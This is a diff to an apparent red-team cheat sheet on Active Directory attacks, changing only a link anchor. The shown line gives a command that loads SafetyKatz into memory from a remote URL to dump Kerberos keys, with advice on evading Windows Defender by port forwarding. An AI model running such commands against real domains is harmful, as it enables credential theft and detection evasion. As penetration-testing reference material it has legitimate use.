@@ -12,4 +12,4 @@
 - Pass The Ticket
 - DCSync
 - Bypassing AMSI and ETW via FlangVik NetLoader
-    - `Loader.exe -path http://127.0.0.1/SafetyKatz.exe sekurlsa::ekeys exit` (Assuming port forwarding is set, here SafetyKatz.exe is downloaded in memory from remote source, command are executed afterwards. Without port forwrding also works, but Windows Defender behavioural detection would block the download. Hence, it is advised to setup [port forwarding](AD_LateralMovement.md) before)
+    - `Loader.exe -path http://127.0.0.1/SafetyKatz.exe sekurlsa::ekeys exit` (Assuming port forwarding is set, here SafetyKatz.exe is downloaded in memory from remote source, command are executed afterwards. Without port forwrding also works, but Windows Defender behavioural detection would block the download. Hence, it is advised to setup [port forwarding](AD_LateralMovement.md#port-forwarding-to-transfer-files) before)
